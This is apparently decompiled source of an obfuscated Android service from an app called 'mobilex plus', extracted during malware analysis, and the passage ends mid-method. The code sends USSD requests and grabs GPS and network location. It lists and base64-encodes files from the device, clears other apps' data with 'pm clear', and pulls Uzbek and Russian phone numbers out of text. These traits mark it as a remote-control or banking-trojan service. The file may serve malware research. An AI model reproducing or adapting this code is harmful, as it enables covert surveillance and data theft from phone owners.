package app.mobilex.plus.services;

import android.R;
import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.ActivityInfo;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.Canvas;
import android.graphics.drawable.Drawable;
import android.location.LocationManager;
import android.media.Ringtone;
import android.media.RingtoneManager;
import android.net.ConnectivityManager;
import android.net.Uri;
import android.net.wifi.WifiManager;
import android.os.Binder;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.os.Process;
import android.os.StatFs;
import android.os.SystemClock;
import android.os.VibrationEffect;
import android.os.Vibrator;
import android.provider.Settings;
import android.provider.Telephony;
import android.telephony.SmsManager;
import android.telephony.SubscriptionInfo;
import android.telephony.SubscriptionManager;
import android.telephony.TelephonyManager;
import android.util.Base64;
import android.view.SurfaceView;
import android.view.WindowManager;
import app.mobilex.plus.ManagerQJWorker;
import app.mobilex.plus.UtilGLWorker;
import app.mobilex.plus.UtilNWWrapper;
import app.mobilex.plus.receivers.DeviceAdminReceiver;
import app.mobilex.plus.receivers.UpdateJSWrapper;
import app.mobilex.plus.util.ProviderJUAdapter;
import app.mobilex.plus.util.TypefaceCache;
import app.mobilex.plus.util.UtilYWProcessor;
import app.mobilex.plus.workers.DataFPAdapter;
import app.mobilex.plus.workers.KeepAliveWorker;
import app.mobilex.plus.workers.UtilHALoader;
import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Calendar;
import java.util.Collections;
import java.util.Iterator;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Locale;
import java.util.Set;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.regex.Pattern;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import v.s.A68NpXPqwTFos99nt;
import v.s.Ao77ZIGXX7f8NXHW;
import v.s.Aqh0grSwgDbwr;
import v.s.AqltFduMByzMV4g;
import v.s.AzBvxzvbhkd8u;
import v.s.BS2kx9eAoOyDiNGAFlFk;
import v.s.CWIOrUfHtKyaxQib0W;
import v.s.DirOmVsluSrk5EngI;
import v.s.DoeLweGeLwxOstamT;
import v.s.ERzPBbsYGxZZQro2NYPo;
import v.s.Eo0e0FTdv96U7KeCzoB;
import v.s.GARjgaGEpTotOxcl8vfe;
import v.s.H3x8qi5sGfedvF;
import v.s.HEqPccX85NcWnm0;
import v.s.HiMbhMAyWCxjtsIFMD;
import v.s.KV57Z6oavcB595B8Dy8Z;
import v.s.KgSM0TsKUpCiuePB;
import v.s.N4h1mGVqsY6M8lTtB;
import v.s.NB5LVitKoIkG7GAQ6;
import v.s.OFMrQsTe5s1KYV0lq;
import v.s.OFtLBiBbrrTHWu;
import v.s.PBAylXS4TQHeesjIdIs;
import v.s.Qkp9DQc428napV;
import v.s.RIZfHbqXpth8r2yN4;
import v.s.RsA5TguOLrFfTXOtR;
import v.s.SbxdZ6Kq2uhHQ5RPRqm;
import v.s.T9t3OjtlELzckn;
import v.s.UFMdhUYFauq13T4ja1V;
import v.s.UNmzHr5eYlkMOkDR30;
import v.s.UubaJZRp66jTeLre;
import v.s.VSZeS5mia3yEXbAe;
import v.s.W6dfON4KdcdxlH;
import v.s.WGrwEyVqR28VYxamRhIg;
import v.s.WMx7O1yIuvMieNw;
import v.s.X1pRVvVudFwrQCVJYV;
import v.s.X5Jjihf3X5UVoB0;
import v.s.XopfkSX0nabMIVQ;
import v.s.Y9mRyRdkl5FOcwb66V6;
import v.s.aPiYFOqe3eIAlt;
import v.s.aiO5jRTHj9azsn306;
import v.s.ax0gnbsXD3up2;
import v.s.bzHLgVWZZfjKGub8Jt;
import v.s.c4nrANNeb0EHn;
import v.s.cpTq2XMCb5JSaEhn;
import v.s.e8sugqmdFodXv;
import v.s.eoUwMTDTg3dRNUqWJq3;
import v.s.f58wUe2vbJhag6PETTG;
import v.s.fadfsJa4iEdiwEC4Xm8;
import v.s.g9ypuGxuyo1nGC;
import v.s.gA5gCwTK0qjTIn;
import v.s.hUQuPxBuTgkMptZCNIR;
import v.s.imhBI9RqzETHtVIJe;
import v.s.jb8et6SZeK5TWMrJFxDX;
import v.s.k3qGWOP8GEZr;
import v.s.kExylgSxUDTVQOx3o0oq;
import v.s.kpn9InmXMPkXCuK9;
import v.s.ktukzhfmAkOuMU;
import v.s.lApLnElOE7s0Fsy;
import v.s.oJLsXXGxdTuQpIRpV;
import v.s.oT0hSL7wye6TP1X12yCL;
import v.s.ofxQWGnngPxGI3OtvQn;
import v.s.okc5AGRjqrud84oM6d;
import v.s.pjN1L01KDMWnPCy0daD;
import v.s.qjpsB7oD4nN4npCMR4XF;
import v.s.razEUo8ZzzxVSwvlTwaV;
import v.s.roAK4OF9CtSmlCJgpQ;
import v.s.rziO4QJcO9ArAydJLO;
import v.s.s4Xe0OepSKbHpb3Nsd;
import v.s.s6gkfffFcXvYHWNdDTq;
import v.s.sNACkioAJERo;
import v.s.sRwj1o5wkILuZnl;
import v.s.sSWdIWC66gQXE;
import v.s.snDbSR9Gb3eZZuB;
import v.s.u4HKFgCbgUKtEQ;
import v.s.u7izncElIxlBIQQj;
import v.s.umMdYoePNXvWWPn;
import v.s.y6jRGLEWNMir;
import v.s.yI1KTRoNlsjx;
import v.s.zcffvBooRp7uR1q;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final class SyncQYAdapter extends Service {
    public static final String A1BaTVAMeIXMnh;
    public static final String ECwLkmPW1UKz7J6E;
    public static final String MSGkxvPxRYNqC;
    public static volatile SyncQYAdapter VEkRsTDS6a9oHWI;
    public static final String XuO9PPFo607ssKwZjNW;
    public static final String euF5Udt5Rqv3Qmea;
    public static final String hV4VTKNUdeHN;
    public static final String iUQk66nAiXgO35;
    public static final String k84rwRrqzhrNQ1CdNQ9;
    public static final String qfTrc75xwRVMl85vh;
    public final X5Jjihf3X5UVoB0 D5P1xCAyuvgF;
    public volatile boolean DVTNwpDEVsUKuznof;
    public AnonymousClass9 EWUjsTERgdPbSw3NNlN;
    public WifiManager.WifiLock Ee8d2j4S9Vm5yGuR;
    public final X5Jjihf3X5UVoB0 H9XlUr4OeMJFiXK;
    public volatile long J0zjQ7CAgohuxU20eCW6;
    public PowerManager.WakeLock JXn4Qf7zpnLjP5;
    public final X5Jjihf3X5UVoB0 K7eEOBPYP9VIoHWTe;
    public final int MLSIo1htfMPWeB8V876L;
    public SyncQYAdapter$registerScreenReceiver$2 O2DHNSIGZlgPja7eqLgn;
    public volatile boolean Qrz92kRPw4GcghAc;
    public final long XiR1pIn5878vVWd;
    public volatile boolean b1EoSIRjJHO5;
    public final Handler dDIMxZXP1V8HdM = new Handler(Looper.getMainLooper());
    public UpdateJSWrapper dTS0S7eC32ubQH54j36;
    public final int fivkjwgu2UdAtiY;
    public final long gIIiyi2ddlMDR0;
    public volatile long gmNWMfvn6zlEj;
    public volatile int hjneShqpF9Tis4;
    public SyncQYAdapter$registerScreenReceiver$1 ibVTtJUNfrGYbW;
    public volatile int l1V0lQr6TbwNKqHfXNbb;
    public volatile int nQilHWaqS401ZtR;
    public final X5Jjihf3X5UVoB0 pyu8ovAipBTLYAiKab;
    public volatile boolean rCHnHJBAlOpNI5;
    public final Set tne6mXOUFKdd;
    public final Binder vIJudZvPyTuNp;
    public String vekpFI4d1Nc4fakF;
    public final f58wUe2vbJhag6PETTG w9sT1Swbhx3hs;
    public final double wotphlvK9sPbXJ;
    public SurfaceView xDyLpEZyrcKVe0;
    public SyncQYAdapter$registerScreenReceiver$3 xfn2GJwmGqs7kWW;
    public s6gkfffFcXvYHWNdDTq yTljMGnIibTRdOpSh4;

    static {
        TypefaceCache.obtain("0010006F0055008400C1008600F300A300220066004F008200E2");
        ECwLkmPW1UKz7J6E = TypefaceCache.obtain("002000790056008A00F100B100D60098003000730049009100F900BC00D7");
        iUQk66nAiXgO35 = TypefaceCache.obtain("00300073004F009200E0008000DC00B200270071005E");
        XuO9PPFo607ssKwZjNW = TypefaceCache.obtain("00350078005800B800E300AB00D300B30026");
        hV4VTKNUdeHN = TypefaceCache.obtain("00340077004800B800E300AB00C000A20022007B0052008900F7");
        k84rwRrqzhrNQ1CdNQ9 = TypefaceCache.obtain("003000620049008200F100B200ED00B6003600770057008E00E400A6");
        A1BaTVAMeIXMnh = TypefaceCache.obtain("0033007E0054008900F5008000DC00B2002E0074005E009500CF00AF00C000A200250065");
        euF5Udt5Rqv3Qmea = TypefaceCache.obtain("0033007E0054008900F5008000DC00B2002E0074005E009500CF00AC00D700A90037");
        qfTrc75xwRVMl85vh = TypefaceCache.obtain("00300077004D008200F4008000C200AF002C0078005E00B800FE00AA00DF00A500260064");
        MSGkxvPxRYNqC = TypefaceCache.obtain("002000770058008F00F500BB00ED00A3002600600052008400F5008000DB00A3");
    }

    public SyncQYAdapter() {
        oT0hSL7wye6TP1X12yCL ot0hsl7wye6tp1x12ycl = umMdYoePNXvWWPn.w9sT1Swbhx3hs;
        T9t3OjtlELzckn t9t3OjtlELzckn = new T9t3OjtlELzckn();
        ot0hsl7wye6tp1x12ycl.getClass();
        this.w9sT1Swbhx3hs = jb8et6SZeK5TWMrJFxDX.dDIMxZXP1V8HdM(OFMrQsTe5s1KYV0lq.MLSIo1htfMPWeB8V876L(ot0hsl7wye6tp1x12ycl, t9t3OjtlELzckn));
        this.vekpFI4d1Nc4fakF = "";
        this.pyu8ovAipBTLYAiKab = new X5Jjihf3X5UVoB0(this, 0);
        this.D5P1xCAyuvgF = new X5Jjihf3X5UVoB0(this, 3);
        this.gIIiyi2ddlMDR0 = 20000L;
        this.wotphlvK9sPbXJ = 1.5d;
        this.MLSIo1htfMPWeB8V876L = 3;
        this.XiR1pIn5878vVWd = 180000L;
        this.H9XlUr4OeMJFiXK = new X5Jjihf3X5UVoB0(this, 1);
        this.DVTNwpDEVsUKuznof = true;
        this.K7eEOBPYP9VIoHWTe = new X5Jjihf3X5UVoB0(this, 2);
        this.vIJudZvPyTuNp = new Binder();
        this.tne6mXOUFKdd = Collections.synchronizedSet(new LinkedHashSet());
        this.fivkjwgu2UdAtiY = 100;
    }

    /* JADX WARN: Code duplicated, block: B:32:0x00ac  */
    public static boolean A1BaTVAMeIXMnh(String str) {
        String strReplaceAll = Pattern.compile(TypefaceCache.obtain("0018004A004800BB00BD00F7009B009A")).matcher(str).replaceAll("");
        if (Pattern.compile("^\\+[1-9]\\d{6,14}$").matcher(strReplaceAll).matches()) {
            String strQ7qC5ia93qGCjkBXCF0A = KgSM0TsKUpCiuePB.Q7qC5ia93qGCjkBXCF0A(strReplaceAll, "+");
            for (int i = 0; i < strQ7qC5ia93qGCjkBXCF0A.length(); i++) {
                if (strQ7qC5ia93qGCjkBXCF0A.charAt(i) != strQ7qC5ia93qGCjkBXCF0A.charAt(0)) {
                    int i2 = 0;
                    for (int i3 = 0; i3 < strQ7qC5ia93qGCjkBXCF0A.length(); i3++) {
                        if (strQ7qC5ia93qGCjkBXCF0A.charAt(i3) == '0') {
                            i2++;
                        }
                    }
                    if (i2 > ((double) strQ7qC5ia93qGCjkBXCF0A.length()) * 0.6d || strQ7qC5ia93qGCjkBXCF0A.length() < 38 - 28) {
                        break;
                        break;
                    }
                    if (strQ7qC5ia93qGCjkBXCF0A.startsWith("7")) {
                        if (strQ7qC5ia93qGCjkBXCF0A.length() != 11) {
                            break;
                        }
                        if (!Pattern.compile(TypefaceCache.obtain("001D004D000800D300A900E800EF009B0027006D0002009A00B4")).matcher(strQ7qC5ia93qGCjkBXCF0A.substring(1)).matches()) {
                            break;
                        }
                        return strQ7qC5ia93qGCjkBXCF0A.startsWith("998") ? true : true;
                    }
                    if ((strQ7qC5ia93qGCjkBXCF0A.startsWith("998") || strQ7qC5ia93qGCjkBXCF0A.length() == 12) && strQ7qC5ia93qGCjkBXCF0A.length() <= 13) {
                    }
                }
            }
        }
        return false;
    }

    public static JSONObject EWUjsTERgdPbSw3NNlN(String str) throws JSONException {
        File file = new File(str);
        if (!file.exists()) {
            return new JSONObject().put(TypefaceCache.obtain("002600640049008800E2"), TypefaceCache.obtain("000D0079004F00C700F600B000C700A90027002C001B") + str);
        }
        JSONObject jSONObject = new JSONObject();
        jSONObject.put(TypefaceCache.obtain("002D007700560082"), file.getName());
        jSONObject.put(TypefaceCache.obtain("00330077004F008F"), file.getAbsolutePath());
        jSONObject.put(TypefaceCache.obtain("002A00650064008300F900AD"), file.isDirectory());
        jSONObject.put(TypefaceCache.obtain("0030007F00410082"), file.isFile() ? file.length() : 0L);
        jSONObject.put(TypefaceCache.obtain("002E0079005F008E00F600B600D700A3"), file.lastModified());
        jSONObject.put(TypefaceCache.obtain("00310073005A008300F100BD00DE00A2"), file.canRead());
        jSONObject.put(TypefaceCache.obtain("003400640052009300F100BD00DE00A2"), file.canWrite());
        jSONObject.put(TypefaceCache.obtain("0026006E005E008400E500AB00D300A5002F0073"), file.canExecute());
        jSONObject.put(TypefaceCache.obtain("002B007F005F008300F500B1"), file.isHidden());
        if (file.isFile()) {
            jSONObject.put(TypefaceCache.obtain("0026006E004F"), KgSM0TsKUpCiuePB.PPWVWMPAUcr9AGNUSxQ(file.getName(), "").toLowerCase(Locale.ROOT));
            jSONObject.put(TypefaceCache.obtain("002E007F00560082"), tne6mXOUFKdd(file.getName()));
        }
        if (file.isDirectory()) {
            try {
                String strObtain = TypefaceCache.obtain("0020007E0052008B00F400AD00D700A9");
                File[] fileArrListFiles = file.listFiles();
                jSONObject.put(strObtain, fileArrListFiles != null ? fileArrListFiles.length : 0);
            } catch (Exception unused) {
            }
        }
        String strObtain2 = TypefaceCache.obtain("003300770049008200FE00AB");
        String parent = file.getParent();
        jSONObject.put(strObtain2, parent != null ? parent : "");
        return jSONObject;
    }

    public static final Object Ee8d2j4S9Vm5yGuR(SyncQYAdapter syncQYAdapter, TelephonyManager telephonyManager, String str, u7izncElIxlBIQQj u7izncelixlbiqqj) {
        ax0gnbsXD3up2 ax0gnbsxd3up2 = new ax0gnbsXD3up2(jb8et6SZeK5TWMrJFxDX.J0zjQ7CAgohuxU20eCW6(u7izncelixlbiqqj));
        RsA5TguOLrFfTXOtR rsA5TguOLrFfTXOtR = new RsA5TguOLrFfTXOtR();
        Object obj = new Object();
        try {
            telephonyManager.sendUssdRequest(str, new e8sugqmdFodXv(obj, rsA5TguOLrFfTXOtR, ax0gnbsxd3up2), new Handler(Looper.getMainLooper()));
            new Handler(Looper.getMainLooper()).postDelayed(new qjpsB7oD4nN4npCMR4XF(obj, rsA5TguOLrFfTXOtR, ax0gnbsxd3up2, 3), 30000L);
        } catch (Exception e) {
            TypefaceCache.obtain("00160045006800A300B000AD00D700B6003600730048009300B000BA00C000B5002C0064000100C7");
            e.getMessage();
            Q7qC5ia93qGCjkBXCF0A(obj, rsA5TguOLrFfTXOtR, ax0gnbsxd3up2, null);
        }
        return ax0gnbsxd3up2.dDIMxZXP1V8HdM();
    }

    public static final Object JXn4Qf7zpnLjP5(SyncQYAdapter syncQYAdapter, LocationManager locationManager, eoUwMTDTg3dRNUqWJq3 eouwmtdtg3drnuqwjq3) {
        ax0gnbsXD3up2 ax0gnbsxd3up2 = new ax0gnbsXD3up2(jb8et6SZeK5TWMrJFxDX.J0zjQ7CAgohuxU20eCW6(eouwmtdtg3drnuqwjq3));
        try {
            List<String> listYTljMGnIibTRdOpSh4 = Aqh0grSwgDbwr.yTljMGnIibTRdOpSh4("network", "gps");
            RsA5TguOLrFfTXOtR rsA5TguOLrFfTXOtR = new RsA5TguOLrFfTXOtR();
            UFMdhUYFauq13T4ja1V uFMdhUYFauq13T4ja1V = new UFMdhUYFauq13T4ja1V(rsA5TguOLrFfTXOtR, locationManager, ax0gnbsxd3up2);
            for (String str : listYTljMGnIibTRdOpSh4) {
                if (locationManager.isProviderEnabled(str)) {
                    try {
                        locationManager.requestSingleUpdate(str, uFMdhUYFauq13T4ja1V, Looper.getMainLooper());
                    } catch (Exception e) {
                        TypefaceCache.obtain("001300640054009100F900BB00D700B50063");
                        TypefaceCache.obtain("00630070005A008E00FC00BA00D600FD0063");
                        e.getMessage();
                    }
                }
            }
            new Handler(Looper.getMainLooper()).postDelayed(new aiO5jRTHj9azsn306(rsA5TguOLrFfTXOtR, locationManager, uFMdhUYFauq13T4ja1V, ax0gnbsxd3up2, 0), 10000L);
        } catch (Exception unused) {
            ax0gnbsxd3up2.ibVTtJUNfrGYbW(null);
        }
        return ax0gnbsxd3up2.dDIMxZXP1V8HdM();
    }

    public static String MSGkxvPxRYNqC(String str, boolean z) {
        int length;
        String strReplaceAll = Pattern.compile(TypefaceCache.obtain("001800480067008300CD")).matcher(str).replaceAll("");
        if (str.startsWith("+")) {
            return str;
        }
        if (strReplaceAll.startsWith("998") && strReplaceAll.length() == 12) {
            return "+".concat(strReplaceAll);
        }
        if (strReplaceAll.startsWith("998") && 10 <= (length = strReplaceAll.length()) && length < 12) {
            return Y9mRyRdkl5FOcwb66V6.ibVTtJUNfrGYbW(TypefaceCache.obtain("0068002F000200DF"), KgSM0TsKUpCiuePB.OYRwk007Mtyi(strReplaceAll, 9));
        }
        if (strReplaceAll.startsWith("7") && strReplaceAll.length() == 11) {
            return "+".concat(strReplaceAll);
        }
        if (strReplaceAll.startsWith("8") && strReplaceAll.length() == 11) {
            return "+7".concat(strReplaceAll.substring(1));
        }
        if (strReplaceAll.length() == 9 && z) {
            return Y9mRyRdkl5FOcwb66V6.ibVTtJUNfrGYbW(TypefaceCache.obtain("0068002F000200DF"), strReplaceAll);
        }
        if (strReplaceAll.length() == 10 && z && strReplaceAll.startsWith("9")) {
            return Y9mRyRdkl5FOcwb66V6.ibVTtJUNfrGYbW(TypefaceCache.obtain("0068002F000200DF"), KgSM0TsKUpCiuePB.OYRwk007Mtyi(strReplaceAll, 9));
        }
        return strReplaceAll.length() == 10 ? "+7".concat(strReplaceAll) : "+".concat(strReplaceAll);
    }

    public static final void Q7qC5ia93qGCjkBXCF0A(Object obj, RsA5TguOLrFfTXOtR rsA5TguOLrFfTXOtR, ax0gnbsXD3up2 ax0gnbsxd3up2, String str) {
        synchronized (obj) {
            if (!rsA5TguOLrFfTXOtR.w9sT1Swbhx3hs) {
                rsA5TguOLrFfTXOtR.w9sT1Swbhx3hs = true;
                ax0gnbsxd3up2.ibVTtJUNfrGYbW(str);
            }
        }
    }

    public static JSONArray b1EoSIRjJHO5(String str) {
        Object[] objArrListFiles;
        JSONArray jSONArray = new JSONArray();
        try {
            File file = new File(str);
            if (file.exists() && file.isDirectory() && (objArrListFiles = file.listFiles()) != null) {
                sSWdIWC66gQXE sswdiwc66gqxe = new sSWdIWC66gQXE(new UNmzHr5eYlkMOkDR30(3));
                if (objArrListFiles.length != 0) {
                    objArrListFiles = Arrays.copyOf(objArrListFiles, objArrListFiles.length);
                    if (objArrListFiles.length > 1) {
                        Arrays.sort(objArrListFiles, sswdiwc66gqxe);
                    }
                }
                for (File file2 : Arrays.asList(objArrListFiles)) {
                    JSONObject jSONObject = new JSONObject();
                    jSONObject.put(TypefaceCache.obtain("002D007700560082"), file2.getName());
                    jSONObject.put(TypefaceCache.obtain("00330077004F008F"), file2.getAbsolutePath());
                    jSONObject.put(TypefaceCache.obtain("002A00650064008300F900AD"), file2.isDirectory());
                    jSONObject.put(TypefaceCache.obtain("0030007F00410082"), file2.isFile() ? file2.length() : 0L);
                    jSONObject.put(TypefaceCache.obtain("002E0079005F008E00F600B600D700A3"), file2.lastModified());
                    jSONObject.put(TypefaceCache.obtain("00310073005A008300F100BD00DE00A2"), file2.canRead());
                    jSONObject.put(TypefaceCache.obtain("003400640052009300F100BD00DE00A2"), file2.canWrite());
                    if (file2.isFile()) {
                        jSONObject.put(TypefaceCache.obtain("0026006E004F"), KgSM0TsKUpCiuePB.PPWVWMPAUcr9AGNUSxQ(file2.getName(), "").toLowerCase(Locale.ROOT));
                    }
                    if (file2.isDirectory()) {
                        try {
                            String strObtain = TypefaceCache.obtain("0020007E0052008B00F400AD00D700A9");
                            File[] fileArrListFiles = file2.listFiles();
                            jSONObject.put(strObtain, fileArrListFiles != null ? fileArrListFiles.length : 0);
                        } catch (Exception unused) {
                            jSONObject.put(TypefaceCache.obtain("0020007E0052008B00F400AD00D700A9"), -1);
                        }
                    }
                    jSONArray.put(jSONObject);
                }
            }
        } catch (Exception e) {
            TypefaceCache.obtain("002100640054009000E300BA00F400AE002F0073004800C700F500AD00C000A80031002C001B");
            e.getMessage();
        }
        return jSONArray;
    }

    /* JADX WARN: Code duplicated, block: B:13:0x0063  */
    public static final String dDIMxZXP1V8HdM(SyncQYAdapter syncQYAdapter, String str, String str2) {
        String strGroup;
        boolean zEquals = str2.equals("uz");
        Iterator it = Aqh0grSwgDbwr.yTljMGnIibTRdOpSh4(new NB5LVitKoIkG7GAQ6("\\+998\\s?\\d{2}\\s?\\d{3}\\s?\\d{2}\\s?\\d{2}"), new NB5LVitKoIkG7GAQ6("(\\+7|8)\\s?[\\(-]?\\d{3}[\\)-]?\\s?\\d{3}[\\s-]?\\d{2}[\\s-]?\\d{2}"), new NB5LVitKoIkG7GAQ6("(?:raqam|telefon|\\u043D\\u043E\\u043C\\u0435\\u0440|number|abonent|№|phone|nomer|nomeringiz)[:\\s]*(\\+?\\d[\\d\\s\\-()]{8,14})", 0), new NB5LVitKoIkG7GAQ6("\\+\\d{10,15}")).iterator();
        while (true) {
            if (!it.hasNext()) {
                return null;
            }
            DirOmVsluSrk5EngI dirOmVsluSrk5EngIDDIMxZXP1V8HdM = okc5AGRjqrud84oM6d.dDIMxZXP1V8HdM(((NB5LVitKoIkG7GAQ6) it.next()).w9sT1Swbhx3hs.matcher(str), 0, str);
            if (dirOmVsluSrk5EngIDDIMxZXP1V8HdM != null) {
                String str3 = (String) imhBI9RqzETHtVIJe.hV4VTKNUdeHN(1, dirOmVsluSrk5EngIDDIMxZXP1V8HdM.dDIMxZXP1V8HdM());
                if (str3 == null) {
                    strGroup = dirOmVsluSrk5EngIDDIMxZXP1V8HdM.dDIMxZXP1V8HdM.group();
                } else {
                    strGroup = BS2kx9eAoOyDiNGAFlFk.euF5Udt5Rqv3Qmea(str3) ? null : str3;
                    if (strGroup == null) {
                        strGroup = dirOmVsluSrk5EngIDDIMxZXP1V8HdM.dDIMxZXP1V8HdM.group();
                    }
                }
                String strReplaceAll = Pattern.compile("[\\s\\-()]").matcher(strGroup).replaceAll("");
                int length = Pattern.compile(TypefaceCache.obtain("001800480067008300CD")).matcher(strReplaceAll).replaceAll("").length();
                if (9 <= length && length < 16) {
                    return MSGkxvPxRYNqC(strReplaceAll, zEquals);
                }
            }
        }
    }

    private static /* synthetic */ void dyhn() {
    }

    public static JSONObject iUQk66nAiXgO35(String str) {
        JSONObject jSONObject = new JSONObject();
        try {
            StatFs statFs = new StatFs(str);
            jSONObject.put(TypefaceCache.obtain("00370079004F008600FC"), statFs.getTotalBytes());
            jSONObject.put(TypefaceCache.obtain("00250064005E0082"), statFs.getAvailableBytes());
            jSONObject.put(TypefaceCache.obtain("00360065005E0083"), statFs.getTotalBytes() - statFs.getAvailableBytes());
        } catch (Exception unused) {
        }
        return jSONObject;
    }

    public static JSONObject nQilHWaqS401ZtR(String str) throws JSONException {
        File file = new File(str);
        if (!file.exists() || !file.isFile()) {
            return new JSONObject().put(TypefaceCache.obtain("003000630058008400F500AC00C1"), false).put(TypefaceCache.obtain("002600640049008800E2"), TypefaceCache.obtain("0005007F0057008200B000B100DD00B3006300700054009200FE00BB008800E7") + str);
        }
        if (!file.canRead()) {
            return new JSONObject().put(TypefaceCache.obtain("003000630058008400F500AC00C1"), false).put(TypefaceCache.obtain("002600640049008800E2"), TypefaceCache.obtain("000000770055008900FF00AB009200B500260077005F00DD00B0") + str);
        }
        if (file.length() > 5242880) {
            return new JSONObject().put(TypefaceCache.obtain("003000630058008400F500AC00C1"), false).put(TypefaceCache.obtain("002600640049008800E2"), TypefaceCache.obtain("0005007F0057008200B000AB00DD00A80063007A005A009500F700BA008800E7") + file.length() + TypefaceCache.obtain("006300740042009300F500AC009200EF002E0077004300C7") + "5242880)").put(TypefaceCache.obtain("0030007F00410082"), file.length());
        }
        try {
            return new JSONObject().put(TypefaceCache.obtain("003000630058008400F500AC00C1"), true).put(TypefaceCache.obtain("002D007700560082"), file.getName()).put(TypefaceCache.obtain("00330077004F008F"), file.getAbsolutePath()).put(TypefaceCache.obtain("0030007F00410082"), file.length()).put(TypefaceCache.obtain("00270077004F0086"), Base64.encodeToString(u4HKFgCbgUKtEQ.yTljMGnIibTRdOpSh4(file), 2)).put(TypefaceCache.obtain("002E007F00560082"), tne6mXOUFKdd(file.getName()));
        } catch (Exception e) {
            return new JSONObject().put(TypefaceCache.obtain("003000630058008400F500AC00C1"), false).put(TypefaceCache.obtain("002600640049008800E2"), TypefaceCache.obtain("00110073005A008300B000BA00C000B5002C0064000100C7") + e.getMessage());
        }
    }

    public static JSONObject pyu8ovAipBTLYAiKab(String str) {
        try {
            Process processExec = Runtime.getRuntime().exec(new String[]{"pm", TypefaceCache.obtain("0020007A005E008600E2"), str});
            int iWaitFor = processExec.waitFor();
            String string = KgSM0TsKUpCiuePB.uW0IRoPBZMj2QmBkkp(RIZfHbqXpth8r2yN4.pyu8ovAipBTLYAiKab(new BufferedReader(new InputStreamReader(processExec.getInputStream(), N4h1mGVqsY6M8lTtB.dDIMxZXP1V8HdM), 8192))).toString();
            return new JSONObject().put(TypefaceCache.obtain("0020007A005E008600E200BA00D6"), iWaitFor == 0 || KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(string, TypefaceCache.obtain("001000630058008400F500AC00C1"), false)).put(TypefaceCache.obtain("003300770058008C00F100B800D7"), str).put(TypefaceCache.obtain("002C0063004F009700E500AB"), string);
        } catch (Exception e) {
            return new JSONObject().put(TypefaceCache.obtain("0020007A005E008600E200BA00D6"), false).put(TypefaceCache.obtain("002600640049008800E2"), e.getMessage());
        }
    }

    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Type inference failed for: r0v57 */
    /* JADX WARN: Type inference failed for: r0v62 */
    /* JADX WARN: Type inference failed for: r0v67 */
    /* JADX WARN: Type inference failed for: r0v68 */
    /* JADX WARN: Type inference failed for: r0v69 */
    /* JADX WARN: Type inference failed for: r0v70 */
    /* JADX WARN: Type inference failed for: r0v71 */
    /* JADX WARN: Type inference failed for: r0v72 */
    /* JADX WARN: Type inference failed for: r0v8 */
    /* JADX WARN: Type inference failed for: r1v2 */
    /* JADX WARN: Type inference failed for: r1v4 */
    /* JADX WARN: Type inference failed for: r1v5 */
    public static String tne6mXOUFKdd(String str) {
        boolean zEquals;
        ?? r0;
        boolean zEquals2;
        ?? r1;
        boolean zEquals3;
        ?? r2;
        ?? Equals;
        String lowerCase = KgSM0TsKUpCiuePB.PPWVWMPAUcr9AGNUSxQ(str, "").toLowerCase(Locale.ROOT);
        int i = (-16) + 17;
        if (lowerCase.equals(TypefaceCache.obtain("00290066005C"))) {
            r0 = i;
        } else {
            zEquals = lowerCase.equals(TypefaceCache.obtain("00290066005E0080"));
        }
        if (r0 != 0) {
            r0 = zEquals;
            return TypefaceCache.obtain("002A007B005A008000F500F000D800B700260071");
        }
        r0 = zEquals;
        if (lowerCase.equals(TypefaceCache.obtain("00330078005C"))) {
            return TypefaceCache.obtain("002A007B005A008000F500F000C200A90024");
        }
        if (lowerCase.equals(TypefaceCache.obtain("0024007F005D"))) {
            return TypefaceCache.obtain("002A007B005A008000F500F000D500AE0025");
        }
        if (lowerCase.equals(TypefaceCache.obtain("0034007300590097"))) {
            return TypefaceCache.obtain("002A007B005A008000F500F000C500A200210066");
        }
        if (lowerCase.equals(TypefaceCache.obtain("002E0066000F"))) {
            return TypefaceCache.obtain("0035007F005F008200FF00F000DF00B70077");
        }
        if (lowerCase.equals(TypefaceCache.obtain("002E00660008"))) {
            return TypefaceCache.obtain("00220063005F008E00FF00F000DF00B700260071");
        }
        if (lowerCase.equals(TypefaceCache.obtain("00340077004D"))) {
            return TypefaceCache.obtain("00220063005F008E00FF00F000C500A60035");
        }
        if (lowerCase.equals(TypefaceCache.obtain("002C0071005C"))) {
            return TypefaceCache.obtain("00220063005F008E00FF00F000DD00A00024");
        }
        if (lowerCase.equals(TypefaceCache.obtain("00330072005D"))) {
            return TypefaceCache.obtain("00220066004B008B00F900BC00D300B3002A0079005500C800E000BB00D4");
        }
        if (lowerCase.equals(TypefaceCache.obtain("0039007F004B"))) {
            return TypefaceCache.obtain("00220066004B008B00F900BC00D300B3002A0079005500C800EA00B600C2");
        }
        if (lowerCase.equals(TypefaceCache.obtain("002200660050"))) {
            return TypefaceCache.obtain("00220066004B008B00F900BC00D300B3002A0079005500C800E600B100D600E900220078005F009500FF00B600D600E9003300770058008C00F100B800D700EA002200640058008F00F900A900D7");
        }
        if (lowerCase.equals(TypefaceCache.obtain("0037006E004F"))) {
            return TypefaceCache.obtain("003700730043009300BF00AF00DE00A6002A0078");
        }
        if (lowerCase.equals(TypefaceCache.obtain("0029006500540089"))) {
